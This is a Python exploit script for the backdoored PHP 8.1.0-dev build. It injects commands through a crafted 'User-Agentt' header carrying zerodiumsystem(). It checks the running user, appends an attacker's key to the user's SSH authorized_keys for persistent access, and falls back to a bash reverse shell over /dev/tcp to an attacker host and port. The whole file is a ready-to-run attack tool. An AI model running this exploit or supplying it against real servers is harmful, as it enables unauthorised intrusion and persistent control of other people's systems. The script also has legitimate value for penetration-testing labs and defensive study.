"""
Exploit Title: PHP 8.1.0-dev Remote Command Execution
File Name: php_8.1.0-devRCE.py
Date: 24 May 2021
Exploit Author: b4bygroot
Software: php
Version: 8.1.0-dev
Reference: https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
"""
#!/usr/bin/env python3
import os
import requests
from pwn import *

target = input ("Enter target URL:> ").split ( '\n' ) [0]


def recvResponse ( request, command ):

    header = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "User-Agentt": "zerodiumsystem('" + command + "');"
    }
    response = request.get ( target, headers = header, allow_redirects = False )

    return response


def main ():

    log.success ("Remote Code Execution attempt on php 8.1.0-dev")
    request = requests.Session ( )
    response = request.get (target)
    log.info (f"Connected to {target}")

    # Check if exploitable & gather current user name
    if str (response) == "<Response [200]>":

        command = "whoami"
        response = recvResponse (request, command)
        if str (response) == "<Response [200]>":
            textResp = response.text
            user = textResp.split ('<!DOCTYPE html>') [0].split ('\n') [0]
            log.info (f'Current user: {user}')
        else:
            log.failure ('Not exploitable')
            exit ()

    # Attempting SSH
    if user != 'www-data':
        path = "/home/" + user + "/.ssh"
        command = "ls -la " + path
        response = recvResponse (request, command)
        textResp = response.text
        sshResp = textResp.split ('<!DOCTYPE html>') [0]

        if sshResp:
            log.info (f'Attempting to add public key to authorized_keys')
            command = f"echo \"ssh-rsa SSH-KEY-SSH-KEY-SSH-KEY-SSH-KEY-SSH-KEY\" >> {path}/authorized_keys"
            recvResponse (request, command)
            log.info (
                f"Added SSH public key to 'authorized_keys'\n\t\tTry 'ssh {user}@targetIP -i id_rsa'")

            if input ("Did SSH work? > (y/n) ").split ('\n') [0] == 'y':
                log.success ("Cheers! Exiting program. Happy pwning!")
                exit ( )

    log.failure ("SSH attempt has failed. Attempting reverse shell")
    lHost = input ("LHOST:> " ).split ('\n') [0]
    lPort = input ("LPORT:> ").split ('\n') [0]

    log.info (f"Attempting reverse shell on {lHost}:{lPort}. Start netcat listener")
    command = f"/bin/bash -c \"bash -i >& /dev/tcp/{lHost}/{lPort} 0>&1\""
    sleep (5)
    recvResponse (request, command)
    log.success ("Command injected. Check the listener")


if __name__ == '__main__':

    main ()